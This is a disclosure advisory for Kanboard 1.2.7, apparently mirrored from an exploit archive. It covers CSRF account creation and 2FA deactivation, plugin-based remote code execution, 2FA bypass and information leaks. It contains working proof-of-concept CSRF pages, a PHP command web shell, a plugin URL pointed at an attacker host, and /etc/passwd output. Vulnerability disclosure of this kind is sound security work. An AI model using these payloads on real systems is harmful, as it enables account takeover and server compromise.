@@ -1,0 +1,217 @@
+id: 32260
+date: 02/21/2019
+title: Kanboard 1.2.7 Code Execution / Cross Site Request Forgery Vulnerabilities
+author: Will Boucher
+cves: 
+
+Kanboard 1.2.7 contains multiple vulnerabilities. The vulnerabilities include CSV account import cross site request forgery which allows an unauthenticated attacker to create a new administrative user. Cross site request forgery 2FA deactivation, allowing an unauthenticated attacker to disable an accountas 2FA configuration. A lack of integrity checking or transport layer encryption enforced on plugins enables remote code execution by a malicious admin. Other vulnerabilities include: session privilege retention, 2FA bypass, database user_id and pre-2FA information disclosure.
+
+Date Released: 11/02/2019
+Author: Will Boucher
+Project Website: https://kanboard.org/
+Affected Software: Kanboard 1.2.7
+
+
+
+CSRF - Account Import from CSV file
+
+No CSRF token check is performed during user import via CSV file. An unauthenticated attacker, who can coerce an authenticated administrative user to visit a malicious web page, can import a new administrator account using the /?controller=UserImportController&action=save endpoint.
+
+The following proof-of-concept HTML will add an administrative user with a login of fakeadmin and password of fakeadmin.
+
+
+
+CSRF Proof-of-concept
+
+<html>
+  <body onLoad="submitRequest()">
+  <script>history.pushState('', '', '/')</script>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http:\/\/[KANBOARDHOST]\/kanboard-1.2.7\/?controller=UserImportController&action=save", true);
+        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundary1xqAn1RU5OQAgU5k");
+        xhr.setRequestHeader("Accept", "*\/*");
+        xhr.setRequestHeader("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");
+        xhr.withCredentials = true;
+        var body = "\r\n" +
+          "------WebKitFormBoundary1xqAn1RU5OQAgU5k\r\n" +
+          "Content-Disposition: form-data; name=\"file\"; filename=\"import-users.csv\"\r\n" +
+          "Content-Type: application/octet-stream\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "fakeadmin,fakeadmin,fakeadmin@fakeadmin.com,\"Fake Admin\",1,0,,\r\n" +
+          "\r\n" +
+          "------WebKitFormBoundary1xqAn1RU5OQAgU5k--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+<Center><H1>Nothing to see here. <BR>
+Move along.</H1></Center>
+  </body>
+</html>
+
+CSRF - Deactivate 2FA
+
+No CSRF token check is performed on requests to deactivate 2FA functionality. An unauthenticated attacker who can coerce an authenticated user to visit a malicious web page can deactivate 2FA on the account using the /?controller=TwoFactorController&action=deactivate endpoint.
+
+While this POC illustrates a request for user_id=1, a page could be crafted to send requests for all accounts, discovered using the user_id information disclosure detailed below, removing the need to know the user_id in advance.
+CSRF 2FA Proof-of-concept
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://[KANBOARDHOST]/kanboard-1.2.7/?controller=TwoFactorController&action=deactivate&user_id=1" method="POST">
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+RCE - Malicious Plugin Installation
+
+Kanboard 1.2.7 performs no integrity checking or transport layer encryption enforcement during plugin installation.
+
+An attacker who gains administrative access, such as through the CSRF account import detailed above, can achieve remote code execution on the system hosting Kanboard 1.2.7 through the installation of a malicious plugin.
+
+An attacker can download a plugin from the source repository, decompress the plugin, add a malicious file and re-compress the plugin to be served from a web server the attacker controls.
+
+In this example the TaskAssignCategory plugin is used. The plugin is decompressed and a PHP web shell inserted in the TaskAssignCategory/Action/ directory of the plugin as webshell.php.
+Source of webshell.php
+
+<?php
+    if($_GET['cmd'])
+    {
+        system($_GET['cmd']);
+    }
+?>
+
+The plugin is then compressed and served from a web server the attacker controls.
+
+Once preparations have been made, an attacker who has obtained administrative access to the Kanboard application, such as through CSRF Account Import detailed above, can visit the plugin directory page for plugin installation.
+
+Clicking install for a plugin will result in the following request:
+
+
+http://[KANBOARDHOST]/kanboard-1.2.7/?controller=PluginController&action=install&archive_url=https%253A%252F%252Fraw.githubusercontent.com%252Fdmorlitz%252Fkanboard-TaskAssignCategory%252Fmaster%252Freleases%252FTaskAssignCategory.zip&csrf_token=e2b5e632c49dbdbc846aaed68d93893005a9c17a48fae51f44399626f1a5
+
+The attacker can replace the plugin archive_url with a target they control, serving the plugin they have edited to contain malicious code.
+
+
+http://[KANBOARDHOST]/kanboard-1.2.7/?controller=PluginController&action=install&archive_url=http%253A%252F%252F[ATTACKER_WEB_HOST]%252FTaskAssignCategory.zip&csrf_token=e2b5e632c49dbdbc846aaed68d93893005a9c17a48fae51f44399626f1a5
+
+Kanboard installs the plugin, without performing any integrity checks on the plugin and allowing the plugin to be fetched unencrypted over HTTP from any host specified.
+
+The attacker can then navigate to the malicious code included in the modified plugin for execution:
+
+
+http://[KANBOARDHOST]/kanboard-1.2.7/plugins/TaskAssignCategory/Action/webshell.php?cmd=cat%20/etc/passwd
+
+Response - Remote Code Execution
+
+
+HTTP/1.1 200 OK
+{...snip...}
+Content-Length: 2414
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+{...snip...}
+gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
+kanboard:x:1000:1000:KanBoard,,,:/home/kanboard:/bin/bash
+
+Session Privilege Retention
+
+Kanboard 1.2.7 stores a useras privilege level, or role, in a session entry in the database when a user logs into the application.
+Privilege snippet of stored session
+
+
+"role";s:9:"app-admin";
+
+If a user logs into the application with app-admin privileges and is then demoted to an app-user by another user with permission to do so, the session entry in the database is not destroyed nor updated with the new permission level. The logged in user can enter the account settings page for their own account and restore their permissions to that of administrator.
+2FA - Bypass
+
+By default, Kanboard 1.2.7 is configured to accept Authorization: Basic as a form of authentication for the jsonrpc.php endpoint.
+
+When authenticating to the jsonrpc.php endpoint with valid credentials for an account that is configured to use 2FA, the jsonrpc.php endpoint does not require a second factor of authentication.
+Information Disclosure - Database User_IDs
+
+An unauthenticated user can determine which user_ids exist for accounts in the Kanboard 1.2.7 database by requesting a useras avatar from the AvatarFileController.
+Avatar request example
+
+
+http://[KANBOARDHOST]/kanboard-1.2.7/?controller=AvatarFileController&action=show&user_id=1
+
+If the user_id exists, the application returns:
+
+HTTP/1.1 403 Forbidden
+
+If the user_id does not exist, the application returns:
+
+HTTP/1.1 200 OK
+
+Knowing the user_ids that exist in the database can be useful to an attacker for further attacks such as the 2FA CSRF Deactivation detailed above.
+Information Disclosure - Pre-2FA Projects Disclosure
+
+During the authentication process, with 2FA enabled, Kanboard 1.2.7 discloses project names.
+
+An attacker who acquires login credentials can authenticate to Kanboard 1.2.7 and is presented with a page asking for the 2FA code.
+
+The page requesting the 2FA code, /?controller=TwoFactorController&action=code, reveals project names; illustrated in the HTML snippet below.
+
+In this case the projects are named Project 1, Project 2 and Project 3.
+Pre-2FA Project Listing
+
+{...snip...}
+<header>
+    <div class="title-container">
+        <h1>
+    <span class="logo">
+        <a href="/kanboard-1.2.7/?controller=DashboardController&action=show" class="" title='Dashboard' >K<span>B</span></a>    </span>
+    <span class="title">
+                    Check two factor authentication code            </span>
+    </h1>
+    </div>
+    <div class="board-selector-container">
+                    <div class="js-select-dropdown-autocomplete" data-params='{"name":"boardId","placeholder":"Display another project","items":{"1":"Project 1","2":"Project 2","3":"Project 3"},"redirect":{"regex":"PROJECT_ID","url":"\/kanboard-1.2.7\/?controller=BoardViewController&action=show&project_id=PROJECT_ID"},"onFocus":["board.selector.open"]}'></div>
+            </div>
+{...snip...}
+
+RESOLUTION
+
+31/01/2019 Vendor Patches:
+Commit 19ea9ed6209b36cba5cb8f96224d9e3a0c022c93 CSRF - Deactivate 2FA fixed.
+
+Commit 8cf8f9ef078b31473e9edcb4b9a61a80e3152c0c RCE - Malicious Plugin Installation - Plugins disabled by default
+NOTE: The developers of Kanboard have placed the risk of malicious plugins on the Kanboard instance owner. If plugins are enabled and an attacker gains administrative access to the Kanboard instance, Remote Code Execution continues to be achievable through the installation of a malicious plugin.
+
+Commit 61a55c888889a1ec3376a7a3bba230dc15a378a4 Session Privilege Retention fixed
+
+Commit 322383b0847426cb92533528a784471b94193a3b Information Disclosure - Database User_IDs disclosure fixed
+
+Commit a1c437bce825d90011750199fbcc0ca08ada51b3 Information Disclosure - Pre-2FA Projects Disclosure fixed
+
+01/02/2019 Vendor Patches:
+Commit 061ba4abe179829d7d0acd3422a16110dbc91da5 CSRF - Account Import from CSV file fixed
+
+02/02/2019 Kanboard 1.2.8 released a 2FA bypass fixed
+
+
+
+
+TIMELINE
+
+29/01/2019 GitHub issue opened requesting security contact. https://github.com/kanboard/kanboard/issues/4134
+31/01/2019 Advisory sent to support@kanboard.net
+31/01/2019 Patches commited to GitHub
+01/02/2019 Patches commited to GitHub
+02/02/2019 Kanboard 1.2.8 released
+11/02/2019 Advisory Released
+
+
+#  0day.today [2023-03-22]  #
